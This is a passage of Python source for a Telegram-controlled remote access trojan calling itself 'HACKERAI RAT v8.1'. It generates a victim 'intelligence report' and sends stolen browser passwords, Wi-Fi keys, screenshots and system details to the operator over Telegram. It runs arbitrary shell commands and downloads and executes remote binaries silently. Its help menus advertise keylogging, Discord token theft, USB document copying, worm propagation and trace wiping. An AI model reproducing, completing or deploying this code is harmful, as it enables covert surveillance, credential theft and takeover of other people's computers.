    now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cpu_percent = psutil.cpu_percent()
    ram_percent = psutil.virtual_memory().percent
    disk_percent = disk.percent
    storage_used = f"{check_storage():.1f}"
    signal_str = f"{_connection_quality}%"
    def esc(s):
        return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HACKERAI — Intelligence Report</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Inter:wght@300;400;600;700&display=swap');
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    background: #0a0a1a;
    color: #e0e0e0;
    font-family: 'Inter', -apple-system, sans-serif;
    min-height: 100vh;
    padding: 20px;
  }}
  .container {{ max-width: 1200px; margin: 0 auto; }}
  .header {{
    background: linear-gradient(135deg, #0d1b2a 0%, #1b2838 50%, #0d1b2a 100%);
    border: 1px solid #00c8ff40;
    border-radius: 16px;
    padding: 30px;
    margin-bottom: 24px;
    position: relative;
    overflow: hidden;
  }}
  .header::before {{
    content: '';
    position: absolute;
    top: -50%; left: -50%;
    width: 200%; height: 200%;
    background: radial-gradient(circle at 30% 50%, rgba(0,200,255,0.03) 0%, transparent 50%);
    animation: pulse 8s ease-in-out infinite;
  }}
  @keyframes pulse {{
    0%, 100% {{ opacity: 0.5; }}
    50% {{ opacity: 1; }}
  }}
  .header-content {{ position: relative; z-index: 1; }}
  .header-top {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; flex-wrap: wrap; gap: 10px; }}
  .header-title {{
    font-family: 'JetBrains Mono', monospace;
    font-size: 28px;
    font-weight: 700;
    background: linear-gradient(90deg, #00c8ff, #00ff88);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    letter-spacing: 2px;
  }}
  .header-badge {{
    background: rgba(0,200,255,0.15);
    border: 1px solid #00c8ff40;
    border-radius: 20px;
    padding: 6px 16px;
    font-size: 12px;
    font-family: 'JetBrains Mono', monospace;
    color: #00c8ff;
  }}
  .header-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 12px;
    margin-top: 16px;
  }}
  .header-stat {{
    background: rgba(255,255,255,0.03);
    border-radius: 10px;
    padding: 14px;
    border: 1px solid rgba(255,255,255,0.05);
  }}
  .header-stat-label {{ font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }}
  .header-stat-value {{ font-size: 16px; font-weight: 600; color: #fff; }}
  .section {{
    background: linear-gradient(135deg, #0f0f25 0%, #1a1a35 100%);
    border: 1px solid #ffffff10;
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 20px;
    transition: border-color 0.3s;
  }}
  .section:hover {{ border-color: #ffffff20; }}
  .section-title {{
    font-family: 'JetBrains Mono', monospace;
    font-size: 18px;
    font-weight: 600;
    margin-bottom: 16px;
    padding-bottom: 12px;
    border-bottom: 1px solid #ffffff10;
    display: flex;
    align-items: center;
    gap: 10px;
  }}
  .section-title .icon {{ font-size: 20px; }}
  .network-section {{ border-color: #00c8ff30; }}
  .network-section .section-title {{ color: #00c8ff; border-color: #00c8ff20; }}
  .system-section {{ border-color: #00ff8830; }}
  .system-section .section-title {{ color: #00ff88; border-color: #00ff8830; }}
  .geo-section {{ border-color: #ffd70030; }}
  .geo-section .section-title {{ color: #ffd700; border-color: #ffd70020; }}
  .wifi-section {{ border-color: #ff6b6b30; }}
  .wifi-section .section-title {{ color: #ff6b6b; border-color: #ff6b6b20; }}
  .processes-section {{ border-color: #a855f730; }}
  .processes-section .section-title {{ color: #a855f7; border-color: #a855f720; }}
  .creds-section {{ border-color: #f59e0b30; }}
  .creds-section .section-title {{ color: #f59e0b; border-color: #f59e0b20; }}
  .data-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    gap: 8px;
  }}
  .data-row {{
    display: flex;
    justify-content: space-between;
    padding: 8px 12px;
    background: rgba(255,255,255,0.02);
    border-radius: 6px;
    font-size: 13px;
  }}
  .data-row .key {{ color: #aaa; }}
  .data-row .value {{ color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 12px; }}
  .wifi-table {{
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
  }}
  .wifi-table th {{
    text-align: left;
    padding: 10px 12px;
    background: rgba(255,107,107,0.08);
    color: #ff6b6b;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .wifi-table td {{
    padding: 8px 12px;
    border-bottom: 1px solid #ffffff08;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
  }}
  .wifi-table tr:hover td {{ background: rgba(255,255,255,0.03); }}
  .pass-val {{ color: #ff6b6b !important; }}
  .process-list {{ display: grid; gap: 4px; }}
  .process-header {{
    display: grid;
    grid-template-columns: 60px 80px 80px 1fr;
    gap: 8px;
    padding: 8px 10px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 10px;
    color: #888;
    text-transform: uppercase;
    letter-spacing: 1px;
    border-bottom: 1px solid #ffffff10;
  }}
  .process-item {{
    display: grid;
    grid-template-columns: 60px 80px 80px 1fr;
    gap: 8px;
    padding: 6px 10px;
    border-radius: 4px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    background: rgba(255,255,255,0.02);
  }}
  .process-item:hover {{ background: rgba(168,85,247,0.08); }}
  .process-item .pid {{ color: #888; }}
  .process-item .cpu {{ color: #a855f7; }}
  .process-item .mem {{ color: #22c55e; }}
  .process-item .name {{ color: #ddd; }}
  .status-bar {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
    gap: 12px;
    margin-top: 16px;
  }}
  .status-item {{
    background: rgba(255,255,255,0.03);
    border-radius: 8px;
    padding: 12px;
    text-align: center;
  }}
  .status-label {{ font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; }}
  .status-value {{ font-size: 14px; font-weight: 600; margin-top: 4px; }}
  .status-active {{ color: #22c55e; }}
  .status-inactive {{ color: #666; }}
  .status-warning {{ color: #ffd700; }}
  .status-danger {{ color: #ff4444; }}
  .creds-summary {{
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    padding: 20px;
    background: rgba(245,158,11,0.08);
    border: 1px solid #f59e0b20;
    border-radius: 10px;
    font-size: 24px;
    font-weight: 700;
    color: #f59e0b;
    font-family: 'JetBrains Mono', monospace;
    margin-bottom: 12px;
  }}
  .footer {{
    text-align: center;
    padding: 20px;
    color: #555;
    font-size: 12px;
    font-family: 'JetBrains Mono', monospace;
  }}
  @media (max-width: 768px) {{
    .header-grid {{ grid-template-columns: 1fr 1fr; }}
    .data-grid {{ grid-template-columns: 1fr; }}
    .process-item, .process-header {{ grid-template-columns: 50px 60px 60px 1fr; font-size: 10px; }}
  }}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="header-content">
      <div class="header-top">
        <div class="header-title">HACKERAI — INTELLIGENCE REPORT</div>
        <div class="header-badge">v8.1 · {esc(now_str)}</div>
      </div>
      <div class="header-grid">
        <div class="header-stat">
          <div class="header-stat-label">Hostname</div>
          <div class="header-stat-value">{esc(hostname)}</div>
        </div>
        <div class="header-stat">
          <div class="header-stat-label">Public IP</div>
          <div class="header-stat-value">{esc(public_ip)}</div>
        </div>
        <div class="header-stat">
          <div class="header-stat-label">Local IP</div>
          <div class="header-stat-value">{esc(local_ip)}</div>
        </div>
        <div class="header-stat">
          <div class="header-stat-label">Uptime</div>
          <div class="header-stat-value">{esc(uptime_str)}</div>
        </div>
        <div class="header-stat">
          <div class="header-stat-label">CPU</div>
          <div class="header-stat-value">{cpu_percent}%</div>
        </div>
        <div class="header-stat">
          <div class="header-stat-label">RAM</div>
          <div class="header-stat-value">{ram_percent}%</div>
        </div>
      </div>
    </div>
  </div>
  <div class="section system-section">
    <div class="section-title"><span class="icon">💻</span> System Information</div>
    <div class="data-grid">
      <div class="data-row"><span class="key">Operating System</span><span class="value">{esc(os_line)}</span></div>
      <div class="data-row"><span class="key">CPU</span><span class="value">{esc(cpu_line)}</span></div>
      <div class="data-row"><span class="key">Memory</span><span class="value">{esc(ram_line)}</span></div>
      <div class="data-row"><span class="key">Disk</span><span class="value">{esc(disk_line)}</span></div>
      <div class="data-row"><span class="key">User</span><span class="value">{esc(user_line)}</span></div>
      <div class="data-row"><span class="key">Architecture</span><span class="value">{esc(platform.machine())}</span></div>
      <div class="data-row"><span class="key">Python Version</span><span class="value">{esc(sys.version.split()[0])}</span></div>
      <div class="data-row"><span class="key">Bot Uptime</span><span class="value">{esc(uptime_str)}</span></div>
    </div>
  </div>
  <div class="section network-section">
    <div class="section-title"><span class="icon">🌐</span> Network &amp; Geolocation</div>
    <div class="data-grid">
      <div class="data-row"><span class="key">Public IP</span><span class="value">{esc(public_ip)}</span></div>
      <div class="data-row"><span class="key">Local IP</span><span class="value">{esc(local_ip)}</span></div>
      <div class="data-row"><span class="key">Hostname</span><span class="value">{esc(hostname)}</span></div>
'''
    if geo_city:
        html += f'      <div class="data-row"><span class="key">City</span><span class="value">{esc(geo_city)}</span></div>\n'
    if geo_region:
        html += f'      <div class="data-row"><span class="key">Region</span><span class="value">{esc(geo_region)}</span></div>\n'
    if geo_country:
        html += f'      <div class="data-row"><span class="key">Country</span><span class="value">{esc(geo_country)}</span></div>\n'
    if geo_isp:
        html += f'      <div class="data-row"><span class="key">ISP</span><span class="value">{esc(geo_isp)}</span></div>\n'
    if geo_latlon:
        html += f'      <div class="data-row"><span class="key">Coordinates</span><span class="value">{esc(geo_latlon)}</span></div>\n'
    html += f'      <div class="data-row"><span class="key">Network TX</span><span class="value">{net.bytes_sent//(1024**2)}MB</span></div>\n'
    html += f'      <div class="data-row"><span class="key">Network RX</span><span class="value">{net.bytes_recv//(1024**2)}MB</span></div>\n'
    html += '''
    </div>
    <div class="status-bar">
      <div class="status-item">
        <div class="status-label">Persistence</div>
        <div class="status-value status-active">ACTIVE</div>
      </div>
      <div class="status-item">
        <div class="status-label">Keylogger</div>
'''
    html += f'        <div class="status-value {"status-active" if _listener else "status-inactive"}">{"ACTIVE" if _listener else "OFF"}</div>\n'
    html += f'''
      </div>
      <div class="status-item">
        <div class="status-label">Recording</div>
        <div class="status-value {"status-warning" if _recording_active else "status-inactive"}">{"ACTIVE" if _recording_active else "IDLE"}</div>
      </div>
      <div class="status-item">
        <div class="status-label">Emergency</div>
        <div class="status-value {"status-danger" if _emergency_activated else "status-active"}">{"ACTIVE" if _emergency_activated else "CLEAR"}</div>
      </div>
      <div class="status-item">
        <div class="status-label">Storage</div>
        <div class="status-value">{esc(storage_used)} MB</div>
      </div>
      <div class="status-item">
        <div class="status-label">Signal</div>
        <div class="status-value">{esc(signal_str)}</div>
      </div>
    </div>
  </div>
  <div class="section creds-section">
    <div class="section-title"><span class="icon">🔑</span> Stolen Credentials</div>
    <div class="creds-summary">📊 {cred_count} Browser Credentials Captured</div>
    <p style="color:#888;font-size:13px;text-align:center;">
      Use <code style="background:#ffffff10;padding:2px 8px;border-radius:4px;color:#f59e0b;">/browser</code> to extract and decrypt saved passwords from Chrome, Edge, Brave, Opera &amp; Vivaldi
    </p>
  </div>
  <div class="section wifi-section">
    <div class="section-title"><span class="icon">📶</span> Wi-Fi Networks <span style="font-size:12px;color:#888;font-weight:400;">({len(wifi_networks)} saved)</span></div>
'''
    if wifi_networks:
        html += '''    <table class="wifi-table">
      <thead><tr><th>SSID</th><th>Password</th><th>Auth</th><th>Captured</th></tr></thead>
      <tbody>\n'''
        for ssid, pwd, auth, ts in wifi_networks:
            pwd_display = esc(pwd) if pwd and pwd != '(none)' and pwd != 'none' else '—'
            ts_display = ts[-8:] if ts else '—'
            auth_display = esc(auth) if auth else '—'
            html += f'        <tr><td>{esc(ssid)}</td><td class="pass-val">{pwd_display}</td><td>{auth_display}</td><td style="color:#888;">{ts_display}</td></tr>\n'
        html += '      </tbody>\n    </table>\n'
    else:
        html += '    <p style="color:#888;font-size:13px;">No Wi-Fi networks captured yet. Run <code style="background:#ffffff10;padding:2px 6px;border-radius:4px;">/wifi</code> to scan.</p>\n'
    html += '''
  </div>
  <div class="section processes-section">
    <div class="section-title"><span class="icon">⚙️</span> Top Processes by CPU</div>
    <div class="process-header">
      <span>PID</span><span>CPU</span><span>MEM</span><span>Name</span>
    </div>
    <div class="process-list">
'''
    for proc_str in processes[:15]:
        parts = proc_str.split(' | ', 3)
        if len(parts) == 4:
            pid, cpu, mem, name = parts
            html += f'      <div class="process-item"><span class="pid">{esc(pid)}</span><span class="cpu">{esc(cpu)}</span><span class="mem">{esc(mem)}</span><span class="name">{esc(name)}</span></div>\n'
    html += f'''
    </div>
  </div>
  <div class="footer">
    HACKERAI RAT v8.1 · Generated {esc(now_str)} · Target: {esc(hostname)} · IP: {esc(public_ip)}
  </div>
</div>
</body>
</html>'''
    path = os.path.join(APPDATA_DIR, f'report_{int(time.time())}.html')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(html)
    if os.path.getsize(path) > 100:
        return path
    return None

def cmd_full_report(args):
    try:
        tg_send_msg("🔄 Generating comprehensive intelligence report...", parse_mode="Markdown")
        try:
            grab_wifi_passwords_detailed()
        except:
            pass
        html_path = generate_html_report()
        if html_path and os.path.exists(html_path):
            size_kb = os.path.getsize(html_path) // 1024
            tg_send_file(html_path,
                f"📊 HACKERAI Full Intelligence Report\n"
                f"Target: {platform.node()} | IP: {get_ip_info().get('public_ip','?')}\n"
                f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Size: {size_kb}KB")
            try:
                ip_info = get_ip_info()
                geo_info = get_geo()
                sys_info = get_system_info()
                card = create_info_card(ip_info, geo_info, sys_info)
                if card:
                    tg_send_photo(card, f"📸 System Snapshot — {platform.node()}")
                    try:
                        os.remove(card)
                    except:
                        pass
            except:
                pass
            try:
                os.remove(html_path)
            except:
                pass
            return f"✅ Full intelligence report sent! ({size_kb}KB HTML file)"
        else:
            return "❌ Failed to generate report."
    except Exception as e:
        return f"❌ Report error: {str(e)[:200]}"

# ═══════════════════════════ HELP BUTTON UI ═══════════════════════════
def cmd_help():
    keyboard = {
        "inline_keyboard": [
            [{"text": "📡 Intelligence", "callback_data": "HELP:intel"}],
            [{"text": "🎮 Remote Control", "callback_data": "HELP:control"}],
            [{"text": "🎥 Media", "callback_data": "HELP:media"}],
            [{"text": "⌨️ Keylogger", "callback_data": "HELP:keylog"}],
            [{"text": "🔍 Credentials", "callback_data": "HELP:creds"}],
            [{"text": "⚠️ Dangerous", "callback_data": "HELP:danger"}],
            [{"text": "🛡️ Safety", "callback_data": "HELP:safety"}],
            [{"text": "🐛 Worm Control", "callback_data": "HELP:worm"}],
        ]
    }
    return ("*HACKERAI RAT v8.1* — Select a category below:", keyboard)

def _get_help_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📡 Intelligence", "callback_data": "HELP:intel"}],
            [{"text": "🎮 Remote Control", "callback_data": "HELP:control"}],
            [{"text": "🎥 Media", "callback_data": "HELP:media"}],
            [{"text": "⌨️ Keylogger", "callback_data": "HELP:keylog"}],
            [{"text": "🔍 Credentials", "callback_data": "HELP:creds"}],
            [{"text": "⚠️ Dangerous", "callback_data": "HELP:danger"}],
            [{"text": "🛡️ Safety", "callback_data": "HELP:safety"}],
            [{"text": "🐛 Worm", "callback_data": "HELP:worm"}],
        ]
    }

def handle_help_callback(category):
    pages = {
        "intel": (
            "📡 *RECON & INTELLIGENCE*\n"
            "▫️ `/info` — Full system intelligence + WiFi dump\n"
            "▫️ `/report` — 📊 Full HTML intelligence report\n"
            "▫️ `/status` — Live telemetry (CPU/RAM/uptime)\n"
            "▫️ `/ip` — Public + local IP, hostname\n"
            "▫️ `/geo` — Geolocation (ISP, city, lat/lon)\n"
            "▫️ `/ss` — Screenshot\n"
            "▫️ `/capture` — 3-burst screenshot\n"
            "▫️ `/clipboard` — Read clipboard contents\n"
            "▫️ `/processes` — Top 50 processes by CPU\n"
            "▫️ `/wifi` — Dump saved Wi-Fi passwords\n"
            "▫️ `/whois` — IP/domain lookup\n"
            "▫️ `/scan` — ARP scan local network"
        ),
        "control": (
            "🎮 *REMOTE CONTROL*\n"
            "▫️ `/cmd <command>` — Execute shell command\n"
            "▫️ `/popup` — Display Windows alert box\n"
            "▫️ `/speak` — Text-to-speech\n"
            "▫️ `/browse <url>` — Open URL in browser\n"
            "▫️ `/kill <pid>` — Terminate process\n"
            "▫️ `/download <url>` — Download file\n"
            "▫️ `/exec <url>` — Download + execute binary"
        ),
        "media": (
            "🎥 *MEDIA CAPTURE*\n"
            "▫️ `/record <sec>` — Screen recording (5-300s)\n"
            "▫️ `/stop` — Stop recording\n"
            "▫️ `/record_audio <sec>` — Microphone capture\n"
            "▫️ `/webcam` — Capture webcam photo"
        ),
        "keylog": (
            "⌨️ *KEYLOGGER*\n"
            "▫️ `/key_start` — Start logging (window-aware)\n"
            "▫️ `/key_stop` — Stop logging"
        ),
        "creds": (
            "🔍 *CREDENTIAL EXTRACTION*\n"
            "▫️ `/browser` — Extract saved browser logins\n"
            "   → Chrome, Edge, Brave, Opera, Vivaldi\n"
            "   → Decrypts passwords via Windows DPAPI\n"
            "   → Sends full credential report file\n"
            "▫️ `/tokens` — Extract Discord tokens\n"
            "▫️ `/usb` — List connected USB drives\n"
            "▫️ `/usb_copy` — Copy documents from USB"
        ),
        "danger": (
            "⚠️ *DANGEROUS*\n"
            "▫️ /lock — Lock workstation\n"
            "▫️ /shutdown — Shutdown system\n"
            "▫️ /restart  — Restart system\n"
            "▫️ /persist  — Install persistence\n"
            "▫️ /remove   — Self-destruct RAT\n"
            "▫️ /wipe     — Wipe traces\n"
            "▫️ /reset    — Reset RAT database"
        ),
        "safety": (
            "🛡️ *SAFETY & DATA*\n"
            "▫️ /emergency — Halt all operations\n"
            "▫️ /resume — Resume operations\n"
            "▫️ /history — Last 20 commands\n"
            "▫️ /stored — Show queued exfil data\n"
            "▫️ /flush — Send all stored data\n"
            "▫️ /clear — Wipe local database"
        ),
        "worm": (
            "🐛 *WORM PROPAGATION*\n"
            "▫️ `/worm_status` — Show propagation stats\n"
            "▫️ `/worm_scan` — Manually scan network for targets\n"
            "▫️ `/worm_spread` — Force immediate spread attempt\n"
            "▫️ `/worm_interval <min>` — Set spread interval (default 60)\n"
            "▫️ `/worm_usb` — Force USB infection\n"
            "▫️ `/worm_stop` — Pause worm propagation\n"
            "▫️ `/worm_start` — Resume worm propagation"
        ),
    }
    back_keyboard = {
        "inline_keyboard": [
            [{"text": "⬅️ Back", "callback_data": "HELP:back"}]
        ]
    }
    return pages.get(category, "Unknown category"), back_keyboard

# ═══════════════════════════ Y/N CONFIRMATION SYSTEM ═══════════════════════════
def send_with_abort(cmd_name, args, msg_text, result_func):
    return result_func(args)

def handle_callback_query(callback_data, callback_id, message_id, chat_id):
    global _pending_aborts
    if callback_data.startswith("HELP:"):
        category = callback_data.split(":", 1)[1]
        if category == "back":
            text, keyboard = cmd_help()
            edit_message_text(chat_id, message_id, text, parse_mode="Markdown", keyboard=keyboard)
            answer_callback(callback_id, "Main menu")
        else:
            text, back_keyboard = handle_help_callback(category)
            edit_message_text(chat_id, message_id, text, parse_mode="Markdown", keyboard=back_keyboard)
            answer_callback(callback_id, category.capitalize())
        return
    parts = callback_data.split(":", 1)
    if len(parts) != 2 or parts[0] not in ("ABORT", "EXEC"):
        answer_callback(callback_id, "Unknown", show_alert=True)
        return
    uid = parts[1]
    action = parts[0]
    info = _pending_aborts.get(uid)
    if not info:
        answer_callback(callback_id, "Expired or already processed", show_alert=True)
        return
    if info.get("executed"):
        answer_callback(callback_id, "Already executed", show_alert=True)
        return
    if action == "ABORT":
        info["aborted"] = True
        info["executed"] = True
        _pending_aborts.pop(uid, None)
        try:
            remove_keyboard(chat_id, message_id)
        except:
            pass
        try:
            edit_message_text(chat_id, message_id,
                f"❌ Cancelled: `/{info['cmd']} {info['args']}`", parse_mode="Markdown")
        except:
            pass
        answer_callback(callback_id, "Cancelled", show_alert=False)
    elif action == "EXEC":
        info["executed"] = True
        answer_callback(callback_id, "Executing...", show_alert=False)
        try:
            edit_message_text(chat_id, message_id,
                f"⚙️ Executing: `/{info['cmd']} {info['args']}`...", parse_mode="Markdown")
        except:
            pass
        t = threading.Thread(target=_execute_now, args=(uid, info, chat_id, message_id), daemon=True)
        t.start()

def _execute_now(uid, info, chat_id, message_id):
    cmd_name = info["cmd"]
    args = info["args"]
    handler = DANGEROUS_WITH_ABORT.get(f"/{cmd_name}")
    if not handler:
        try:
            edit_message_text(chat_id, message_id, "❌ Handler not found", parse_mode="Markdown")
        except:
            pass
        _pending_aborts.pop(uid, None)
        return
    start_t = time.time()
    try:
        result = handler(args)
    except Exception as e:
        result = f"Error: {str(e)[:200]}"
    duration = int((time.time() - start_t) * 1000)
    set_cooldown(f"/{cmd_name}", args)
    log_command(f"/{cmd_name}", args, info.get("message_id"), duration_ms=duration)
    try:
        remove_keyboard(chat_id, message_id)
    except:
        pass
    try:
        edit_message_text(chat_id, message_id,
            f"✅ Executed: `/{cmd_name} {args}` | {duration}ms\n\n{str(result)[:3500]}",
            parse_mode="Markdown")
    except:
        tg_send_msg(f"✅ Executed: `/{cmd_name} {args}` | {duration}ms\n\n{str(result)[:3000]}",
                    parse_mode="Markdown")
    _pending_aborts.pop(uid, None)

# ═══════════════════════════ COMMAND HANDLERS ═══════════════════════════
def cmd_status():
    ip = get_ip_info()
    uptime = f"{int((time.time()-_start_time)//3600)}h {int(((time.time()-_start_time)%3600)//60)}m {int((time.time()-_start_time)%60)}s"
    cpu = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    return (
        f"AGENT: {ip.get('hostname','?')} @ {ip.get('public_ip','?')}\n"
        f"UPTIME: {uptime}\n"
        f"CPU: {cpu}% | RAM: {ram}% | DISK: {disk}%\n"
        f"KEYLOGGER: {'ACTIVE' if _listener else 'OFF'}\n"
        f"RECORDING: {'ACTIVE' if _recording_active else 'IDLE'}\n"
        f"EMERGENCY: {'ACTIVE' if _emergency_activated else 'CLEAR'}\n"
        f"STORAGE: {check_storage():.1f}MB | SIGNAL: {_connection_quality}%\n"
        f"CV2:{CV2_AVAILABLE} SOUND:{SOUNDDEVICE_AVAILABLE} PYNPUT:{PYNPUT_AVAILABLE}"
    )

def cmd_info():
    ip_info = get_ip_info()
    geo_info = get_geo()
    sys_info = get_system_info()
    card = create_info_card(ip_info, geo_info, sys_info)
    if card:
        tg_send_photo(card, "System Intelligence Report")
        try:
            os.remove(card)
        except:
            pass
        try:
            html_path = generate_html_report()
            if html_path:
                tg_send_file(html_path, f"📊 Full Report — {platform.node()}")
                try:
                    os.remove(html_path)
                except:
                    pass
        except:
            pass
        wifi = grab_wifi_passwords_detailed()
        if wifi:
            p = os.path.join(APPDATA_DIR, f"wifi_{int(time.time())}.txt")
            with open(p,"w") as f:
                f.write("Wi-Fi NETWORKS\n"+"="*40+"\n\n")
                for w in wifi:
                    f.write(f"{w}\n")
            tg_send_file(p, "Wi-Fi Networks Dump")
            try:
                os.remove(p)
            except:
                pass
        return "Info card + HTML report + WiFi sent"
    return f"{ip_info.get('hostname','?')} | {ip_info.get('public_ip','?')}"

def cmd_history():
    rows = get_command_history(20)
    if not rows:
        return "No command history"
    return "Recent Commands:\n" + "\n".join(
        f"  {cmd} {args} — {status} ({dur}ms) [{ts[-8:]}]" for cmd,args,ts,status,dur in rows)

def cmd_capture():
    paths = []
    for i in range(3):
        p = take_screenshot()
        if p:
            paths.append(p)
        time.sleep(0.5)
    if paths:
        for p in paths:
            tg_send_photo(p, f"Burst {paths.index(p)+1}")
            try:
                os.remove(p)
            except:
                pass
        return f"Sent {len(paths)} screenshots"
    return "Failed"

def screenshot_cmd():
    p = take_screenshot()
    if p:
        tg_send_photo(p, "Screenshot")
        try:
            os.remove(p)
        except:
            pass
        return "Screenshot sent"
    return "Failed"

def cmd_cmd(command):
    try:
        start_t = time.time()
        r = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
            timeout=30, startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW))
        duration = time.time() - start_t
        out = r.decode("utf-8", errors="ignore")[:3000] or "[no output]"
        return f"Completed ({duration:.1f}s)\n{out}"
    except subprocess.TimeoutExpired:
        return "Timeout (30s)"
    except Exception as e:
        return f"Error: {e}"

def cmd_popup(message):
    msg = message or "SYSTEM ALERT"
    try:
        ctypes.windll.user32.MessageBoxW(0, msg, "SECURITY ALERT", 0x30 | 0x1000)
    except:
        pass
    return f"Popup: '{msg[:100]}'"

def cmd_clipboard():
    if not WIN32CLIPBOARD_AVAILABLE:
        return "pywin32 not installed"
    try:
        win32clipboard.OpenClipboard()
        d = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return f"Clipboard:\n{d[:2000]}" if d else "Empty"
    except:
        return "Error reading clipboard"

def cmd_kill(pid):
    try:
        proc = psutil.Process(int(pid))
        name = proc.name()
        proc.terminate()
        return f"Terminated {name} (PID {pid})"
    except Exception as e:
        return f"Error: {e}"

def cmd_processes():
    p = []
    try:
        for proc in sorted(psutil.process_iter(['pid','name','cpu_percent','memory_percent']),
                           key=lambda x: x.info.get('cpu_percent',0) or 0, reverse=True)[:50]:
            try:
                p.append(f"{proc.info['pid']:>6} | {proc.info['cpu_percent']:>4.1f}% | {proc.info['memory_percent']:>4.1f}% | {proc.info['name']}")
            except:
                pass
    except:
        pass
    return "Top 50 Processes:\n" + "\n".join(p)

def cmd_download(url):
    try:
        r = requests.get(url, timeout=30, stream=True)
        r.raise_for_status()
        name = url.split("/")[-1] or f"dl_{int(time.time())}"
        if '?' in name:
            name = name.split('?')[0]
        if not name:
            name = f"dl_{int(time.time())}"
        path = os.path.join(APPDATA_DIR, name)
        with open(path, "wb") as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        track_file(path, "download")
        return f"Downloaded {len(r.content)}b -> {name}"
    except Exception as e:
        return f"Error: {e}"

def cmd_exec(url):
    try:
        r = requests.get(url, timeout=30)
        name = url.split("/")[-1] or f"exec_{int(time.time())}.exe"
        if '?' in name:
            name = name.split('?')[0]
        if not name.endswith('.exe'):
            name += '.exe'
        path = os.path.join(APPDATA_DIR, name)
        with open(path, "wb") as f:
            f.write(r.content)
        track_file(path, "executable")
        subprocess.Popen([path], shell=True, creationflags=0x08000000)
        return f"Executed {name} ({len(r.content)}b)"
    except Exception as e:
        return f"Error: {e}"

def handle_msgbox(args):
    try:
        if "|" in args:
            t, m = args.split("|", 1)
        else:
            t, m = "Alert", args
        ctypes.windll.user32.MessageBoxW(0, m, t, 0x40)
        return f"MessageBox: {t} - {m[:100]}"
    except:
        return "Failed"

def handle_speak(text):
    if not text:
        return "Usage: /speak <text>"
    try:
        safe = text.replace("'", "''")
        subprocess.Popen(["powershell", "-Command",
            f"Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('{safe}')"],
            creationflags=0x08000000)
        return f"Speaking: {text[:100]}"
    except:
        return "Failed"

def cmd_browse(url):
    if not url:
        return "Usage: /browse <url>"
    if not url.startswith(('http://','https://')):
        url = 'https://' + url
    webbrowser.open(url)
    return f"Opened: {url}"

def cmd_stored():
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT data_type, COUNT(*) FROM collected_data WHERE sent=0 GROUP BY data_type")
    rows = cur.fetchall()
    cur.execute("SELECT COUNT(*) FROM keystrokes WHERE sent=0")
    ks = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM wifi_passwords WHERE sent=0")
    wifi = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM tokens WHERE sent=0")
    tokens = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM browser_credentials WHERE sent=0")
    creds = cur.fetchone()[0]
    conn.close()
    lines = ["Stored Data:"]
    for t, c in rows:
        lines.append(f"  {t}: {c}")
    lines.append(f"  WiFi: {wifi} | Keystrokes: {ks} | Tokens: {tokens} | BrowserCreds: {creds}")
    lines.append(f"  Storage: {check_storage():.1f}MB / {STORAGE_LIMIT_MB}MB")
    return "\n".join(lines)

def cmd_flush():
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT id, ssid, password, auth_type FROM wifi_passwords WHERE sent=0")
    wifis = cur.fetchall()
    if wifis:
        tg_send_msg("📶 *WiFi Networks Dump*\n" + "\n".join(f"  {s} [{a}] -> {p}" for _,s,p,a in wifis), parse_mode="Markdown")
        for r in wifis:
            cur.execute("UPDATE wifi_passwords SET sent=1 WHERE id=?", (r[0],))
    cur.execute("SELECT id, browser, profile, url, username, password FROM browser_credentials WHERE sent=0 ORDER BY id ASC LIMIT 100")
    browser_creds = cur.fetchall()
    if browser_creds:
        p = os.path.join(APPDATA_DIR, f"browser_creds_{int(time.time())}.txt")
        with open(p,"w", encoding='utf-8') as f:
            f.write("BROWSER CREDENTIALS\n"+ "="*60 + "\n\n")
            for _id, br, prof, url, uname, pwd in browser_creds:
                f.write(f"[{br}/{prof}]\n")
                f.write(f"  URL: {url}\n")
                f.write(f"  User: {uname}\n")
                f.write(f"  Pass: {pwd}\n\n")
        tg_send_file(p, f"🔑 Browser Credentials ({len(browser_creds)} logins)")
        try:
            os.remove(p)
        except:
            pass
        for r in browser_creds:
            cur.execute("UPDATE browser_credentials SET sent=1 WHERE id=?", (r[0],))
